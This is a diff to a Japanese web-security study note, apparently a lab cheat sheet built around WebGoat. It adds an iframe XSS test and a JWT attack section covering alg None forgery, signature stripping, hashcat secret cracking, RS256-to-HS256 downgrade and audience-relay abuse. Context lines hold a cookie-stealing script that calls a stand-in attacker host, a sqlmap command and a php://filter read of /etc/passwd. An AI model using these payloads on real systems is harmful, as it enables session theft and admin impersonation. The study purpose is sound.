@@ -96,6 +96,12 @@ sqlmap -u "http://192.168.11.12/WebGoat/attack?Screen=71&menu=1100" \
 <script>document.write('<img src="http://<attacker ip>:8888/' + document.cookie + '">')</script>
 ```
 
+### iframe でテスト
+
+```js
+<iframe src="javascript:alert(`xss`)">
+```
+
 ### 対策
 
 - 全てのユーザー入力をサニタイズ、エスケープ、検証する
@@ -154,9 +160,7 @@ http://192.168.11.15/?lang=php://filter/convert.base64-encode/resource=index
 echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
 ```
 
-## Cookie
-
-### JWT トークン
+## JWT
 
 ```text
 JWTトークンの構成は、
@@ -170,14 +174,56 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzM0Njc
 {"typ":"JWT","alg":"HS256"}
 {"username":"guest","exp":1734676419}
 となる。
+```
 
-ただし、サーバーがNoneアルゴリズムを禁止していない場合、
+#### None アルゴリズム
+
+```text
+サーバーがNoneアルゴリズムを禁止していない場合、
 {"typ":"JWT","alg":"None"}
 {"username":"admin","exp":1734676419}
 のように変更し、
 [ヘッダー].[ペイロード].
 の形で送信すると、サーバー側でシグネチャのチェックが行われなくなる。
 この場合、サーバーはこれをadminのセッションと認識する可能性がある。
+```
+
+#### 署名を検証しない
+
+```text
+"alg":"None"以外でも、署名を検証していない場合、シグネチャ部分を削除しても受け入れられる。
+```
+
+#### 脆弱なシークレット
+
+```text
+hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
+
+でシークレットを割り出せる場合、CyberChef の JWT Sign 等のツールにペイロード部分を渡すことで、JWTを生成できる。
+```
+
+#### 対称署名アルゴリズムへのダウングレード
+
+```text
+例えば、RS256 などの非対称署名アルゴリズムが使用されている場合、アルゴリズムを HS256 にダウングレードできる可能性がある。
+ヘッダーのアルゴリズムを変更し、公開鍵をシークレットとして、JWTを生成してみる。
+```
+
+#### 有効期間
+
+```text
+ペイロードに'exp'が設定されてない場合、トークンが永続的に保持される。
+```
+
+#### サーバー間リレー攻撃
+
+```text
+JWTを共有する複数のアプリケーションから成るシステムでは、AppAではadminだが、AppBではadminではないというケースがある。
+AppAでログインしたとき
+{"admin":1, "audience":"appA"}
+というトークンが作られたとする。
+
+AppBでは、audienceを参照してadminアクセスを拒否するべきだが、audienceのチェックが漏れていて、appBで不正に管理者アクセスを取得できる場合がある。これをサーバー間リレー攻撃という。
 ```
 
 ## セキュリティ視点
